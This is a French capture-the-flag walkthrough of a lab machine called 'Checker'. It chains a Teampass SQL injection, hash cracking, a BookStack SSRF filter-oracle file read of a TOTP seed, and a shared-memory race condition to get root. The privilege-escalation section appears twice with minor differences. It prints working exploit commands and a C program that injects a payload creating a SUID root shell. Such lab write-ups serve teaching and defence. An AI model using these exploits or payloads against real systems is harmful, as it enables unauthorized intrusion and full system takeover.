![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

L'énumération commence par un scan **Nmap** complet pour identifier la surface d'attaque. La machine expose trois ports : **SSH (22)** et deux services **HTTP (80, 8080)**.

```bash
# Scan rapide des ports
nmap -p- --min-rate 10000 10.10.11.56

# Scan de services détaillé
nmap -p 22,80,8080 -sCV 10.10.11.56
```

Le port 80 renvoie un **403 Forbidden**, suggérant un **Virtual Hosting**. En ajoutant `checker.htb` au fichier `/etc/hosts`, j'accède à une instance de **BookStack**. Le port 8080 héberge **Teampass**, un gestionnaire de mots de passe open-source.

#### Énumération de Teampass & SQL Injection (CVE-2023-1545)

L'analyse du fichier `changelog.txt` sur le port 8080 indique une version de **Teampass** antérieure à la 3.0.0.23. Cette version est vulnérable à une **SQL Injection** non authentifiée via l'endpoint d'API `/authorize`.

> **Schéma Mental :** L'injection se situe dans le champ `login` d'une requête POST JSON. L'application traite la requête et, en cas de succès ou d'erreur spécifique, peut refléter des données via un **JWT (JSON Web Token)**. En utilisant un `UNION SELECT`, je peux forger un token contenant des données extraites de la base de données (comme les hashs des utilisateurs) dans le champ `public_key` du payload base64 du JWT.

J'utilise un exploit **PoC** pour extraire les hashs de la table `teampass_users` :

```bash
# Extraction des hashs via l'endpoint API vulnérable
bash cve-2023-1545.sh http://checker.htb:8080
```

Résultats obtenus :
*   **admin**: `$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya`
*   **bob**: `$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy`

Le hash de **bob** est craqué via **Hashcat** avec la wordlist `rockyou.txt` :
`bob : cheerleader`

#### Accès Teampass et Pivot vers BookStack

Une fois connecté à **Teampass** avec les identifiants de bob, je récupère deux entrées critiques :
1.  **BookStack login** : `mYSeCr3T_w1kI_P4sSw0rD`
2.  **SSH access (user: reader)** : `hiccup-publicly-genesis`

La tentative de connexion **SSH** échoue car un **Two-Factor Authentication (2FA)** est activé. Je me rabats sur **BookStack** (port 80) où les identifiants de bob fonctionnent.

#### Exploitation SSRF & PHP Filter Oracle (CVE-2023-6199)

**BookStack v23.10.2** est vulnérable à une **SSRF (Server-Side Request Forgery)** via le paramètre `html` de l'endpoint `/ajax/page/<id>/save-draft`. Bien que l'application ne renvoie pas directement le contenu des fichiers, elle est vulnérable à une attaque de type **Blind PHP Filter Oracle**.

> **Schéma Mental :** L'attaque repose sur l'utilisation de **PHP Filters** en chaîne. En envoyant des chaînes de filtres complexes (conversion d'encodages), on peut forcer l'application à générer une erreur ou un délai si un caractère spécifique est présent à une position donnée dans le fichier cible. C'est une exfiltration bit-à-bit basée sur l'état de la réponse HTTP.

Je cible le fichier de configuration **Google Authenticator** de l'utilisateur `reader`. Un article sur le site mentionne des sauvegardes dans `/backup/home_backup/`.

```bash
# Commande type pour exploiter l'oracle via le script de filtrage
python3 filters_chain_oracle_exploit.py --verb PUT \
--file /backup/home_backup/home/reader/.google_authenticator \
--target http://checker.htb/ajax/page/8/save-draft \
--parameter html --headers '{"X-CSRF-TOKEN": "..."}'
```

Le script extrait le **Secret Seed** du 2FA : `DVDBRAODLCWF7I2ONA4K5LQLUE`.

#### Brèche Initiale : SSH via TOTP

Pour générer le code de validation, je dois synchroniser mon horloge avec celle du serveur, car le **TOTP (Time-based One-Time Password)** est sensible au temps.

```bash
# Récupération de l'heure du serveur et génération du code
oathtool -b --totp DVDBRAODLCWF7I2ONA4K5LQLUE --now="$(curl -sI http://checker.htb | grep Date)"
```

Avec le mot de passe `hiccup-publicly-genesis` et le code généré, j'obtiens un shell stable sur la machine en tant que **reader**.

```bash
ssh reader@checker.htb
# Saisie du Password puis du Verification code
```

---

### Énumération Post-Exploitation & Pivot

Une fois l'accès initial obtenu sur l'instance **BookStack**, l'objectif est de pivoter vers un accès système via **SSH**. L'énumération des fichiers de configuration et des bases de données révèle des identifiants pour l'utilisateur `reader`, mais celui-ci est protégé par une **Two-Factor Authentication (2FA)** basée sur **Google Authenticator**.

#### Exploitation SSRF & Blind PHP Filter Oracle
Le serveur exécute **BookStack v23.10.2**, vulnérable à une **SSRF** (**CVE-2023-6199**) via le paramètre `html` du endpoint `/ajax/page/<id>/save-draft`. Comme l'application ne retourne pas directement le contenu des fichiers, j'utilise une technique de **Blind File Oracle** basée sur les **PHP Filter Chains**.

> **Schéma Mental :**
> 1. **Vecteur :** L'application utilise `file_get_contents()` sur une URL fournie.
> 2. **Contrainte :** Pas d'affichage direct (Blind).
> 3. **Technique :** Utiliser des filtres PHP (`convert.iconv.*`) pour générer des erreurs ou des variations de temps/réponse basées sur le premier caractère du contenu du fichier.
> 4. **Cible :** Le fichier de backup `/backup/home_backup/home/reader/.google_authenticator` pour extraire la **TOTP Seed**.

```bash
# Commande type pour lancer l'exploit de fuite de fichier via PHP Filter Chain
uv run filters_chain_oracle_exploit.py --verb PUT \
  --file /backup/home_backup/home/reader/.google_authenticator \
  --target http://checker.htb/ajax/page/8/save-draft \
  --parameter html \
  --headers '{"Cookie": "...", "X-CSRF-TOKEN": "..."}'
```

Après extraction de la seed (`DVDBRAODLCWF7I2ONA4K5LQLUE`), je génère le code de vérification en synchronisant l'heure locale avec celle du serveur (extraite via le header HTTP `Date`).

```bash
# Génération du code TOTP synchronisé
oathtool -b --totp "DVDBRAODLCWF7I2ONA4K5LQLUE" --now="$(curl -sI http://checker.htb | grep Date | cut -d' ' -f3-)"
```

---

### Escalade de Privilèges : Root

L'énumération des privilèges `sudo` montre que l'utilisateur `reader` peut exécuter un script spécifique en tant que **root**.

```bash
reader@checker:~$ sudo -l
(ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

#### Analyse du binaire `check_leak`
Le script `check-leak.sh` appelle un binaire compilé `check_leak`. L'analyse via **Ghidra** révèle le workflow suivant :
1. Le binaire récupère le hash d'un utilisateur en base de données.
2. Il compare ce hash avec une liste de hashes fuités dans `/opt/hash-checker/leaked_hashes.txt`.
3. Si une correspondance est trouvée, il crée un segment de **Shared Memory** (mémoire partagée) avec les permissions `0666` (world-writable).
4. Il écrit un message de log dans cette mémoire.
5. **Vulnérabilité :** Le programme effectue un `sleep(1)` avant de relire la mémoire pour construire une commande `mysql` via `popen()`.

> **Schéma Mental :**
> 1. **Race Condition :** Il existe une fenêtre d'une seconde entre l'écriture en mémoire et sa lecture.
> 2. **Shared Memory Poisoning :** Puisque la mémoire est accessible à tous (`0666`), je peux écraser le contenu durant le `sleep`.
> 3. **Command Injection :** Le binaire utilise `strstr` pour chercher un délimiteur `>` et exécute ce qui suit dans un shell. En injectant `; command ;`, j'obtiens l'exécution de code en tant que **root**.

#### Exploitation de la Race Condition
Je compile un exploit en C qui boucle pour tenter de deviner la clé de la mémoire partagée (basée sur `rand()` et le `timestamp` actuel) et y injecter un payload de **Command Injection**.

```c
// d.c - Exploit de poisoning de mémoire partagée
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff; // Même logique de génération de clé que le binaire
    int shmid = shmget(key, 0x400, 0x3b6);
    char *h_shm = shmat(shmid, (void *) 0, 0);
    // Injection du payload pour créer un shell SUID
    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash;#");
    shmdt(h_shm);
    return 0;
}
```

**Exécution de l'attaque :**

```bash
# Terminal 1 : Boucle d'empoisonnement
while true; do ./d; done

# Terminal 2 : Déclenchement du binaire via sudo
sudo /opt/hash-checker/check-leak.sh bob

# Terminal 1 : Récupération du shell root
/tmp/rootbash -p
```

L'utilisation de `bob` est nécessaire car son hash est présent dans `leaked_hashes.txt`, ce qui déclenche le chemin de code vulnérable utilisant la **Shared Memory**. Le flag `root.txt` est alors accessible.

---

### Phase 3 : Élévation de Privilèges & Domination (Root)

#### Énumération des vecteurs privilégiés

Une fois mon accès établi en tant qu'utilisateur **reader**, je commence par inspecter mes privilèges **sudo**. L'utilisateur dispose d'une configuration permissive permettant d'exécuter un script spécifique sans mot de passe.

```bash
reader@checker:~$ sudo -l
User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

Le script `/opt/hash-checker/check-leak.sh` est un wrapper **Bash** qui source un fichier `.env` (inaccessible en lecture), nettoie l'argument fourni pour ne garder que les caractères alphanumériques, puis appelle un binaire compilé nommé `check_leak`.

#### Analyse du binaire `check_leak`

En analysant le binaire avec **Ghidra**, je décompose la logique d'exécution suivante :
1.  Le programme récupère les identifiants de base de données via des variables d'environnement.
2.  Il extrait le **hash** de l'utilisateur fourni en argument depuis la base de données.
3.  Il compare ce **hash** avec une liste de compromissions dans `/opt/hash-checker/leaked_hashes.txt`.
4.  Si une correspondance est trouvée, il utilise la fonction `write_to_shm` pour stocker une alerte dans la **Shared Memory**.
5.  Le programme effectue un `sleep(1)`.
6.  Il appelle `notify_user`, qui lit la **Shared Memory**, parse le contenu et exécute une commande `mysql` via `popen()` pour récupérer l'email de l'utilisateur.

La vulnérabilité majeure réside dans l'utilisation de la **Shared Memory** (SHM). Le binaire utilise `shmget` avec les permissions `0x3b6` (soit `0666` en octal), ce qui rend le segment de mémoire **world-writable**.

> **Schéma Mental : Race Condition sur Shared Memory**
> 1. **Root** lance le binaire -> Le hash est trouvé -> Écriture dans la SHM.
> 2. **Root** entre en `sleep(1)` -> Fenêtre d'opportunité.
> 3. **Attaquant** identifie la clé SHM -> Écrase le contenu de la SHM avec une **Command Injection**.
> 4. **Root** se réveille -> Lit la SHM empoisonnée -> Exécute la charge utile via `popen()`.

#### Exploitation de la Race Condition

Le binaire génère sa clé SHM de manière prédictible en utilisant `srand(time(NULL))`. Je peux donc synchroniser un exploit en C pour calculer la même clé et injecter mon payload durant la seconde de pause du binaire.

**Exploit C (`exploit.c`) :**
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    // Synchronisation avec le seed du binaire root
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff;

    // Accès au segment de mémoire partagée
    int shmid = shmget(key, 0x400, 0x3b6);
    if (shmid < 0) return 1;

    char *h_shm = shmat(shmid, (void *) 0, 0);
    
    // Injection de commande via le parsing du caractère '>'
    // Payload : copie de bash avec SUID
    snprintf(h_shm, 0x400, "Leaked hash detected at X > '; cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash; #");
    
    shmdt(h_shm);
    return 0;
}
```

**Exécution de l'attaque :**

Je compile l'exploit et je le lance dans une boucle infinie pour garantir la collision lors de la fenêtre du `sleep`.

```bash
# Terminal 1 : Boucle d'empoisonnement
reader@checker:/tmp$ gcc exploit.c -o exploit
reader@checker:/tmp$ while true; do ./exploit; done

# Terminal 2 : Déclenchement du binaire privilégié
# L'utilisateur 'bob' est connu pour avoir un hash fuité
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
```

Une fois l'erreur SQL affichée (indiquant que l'injection a perturbé la requête `mysql` légitime), je vérifie la présence de mon binaire **SUID**.

```bash
reader@checker:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(reader) gid=1000(reader) euid=0(root) egid=0(root) groups=0(root)
```

#### Beyond Root : Analyse Post-Exploitation

L'analyse du binaire `check_leak` révèle plusieurs couches de mauvaises pratiques de sécurité :
1.  **Insecure Shared Memory Permissions** : L'utilisation de `0666` permet à n'importe quel utilisateur local de modifier des données traitées par un processus privilégié.
2.  **Predictable Random Seed** : L'utilisation de `time(NULL)` comme graine pour `srand` rend les ressources IPC (Inter-Process Communication) prédictibles.
3.  **Unsafe Function Call** : L'utilisation de `popen()` avec une chaîne de caractères construite dynamiquement à partir d'une source non fiable (la SHM modifiable) est une invitation directe à la **Command Injection**.
4.  **ASAN (AddressSanitizer)** : Le binaire semble avoir été compilé avec des options d'instrumentation (visibles via les appels `__asan_report_load8`), ce qui est inhabituel pour un environnement de production et peut parfois faciliter le debugging d'exploits mémoire.

La remédiation consisterait à utiliser des permissions SHM restreintes (`0600`), à valider strictement le contenu lu en mémoire avant traitement, et à privilégier des API d'exécution plus sûres comme `execve()` en passant les arguments sous forme de tableau plutôt que via un shell.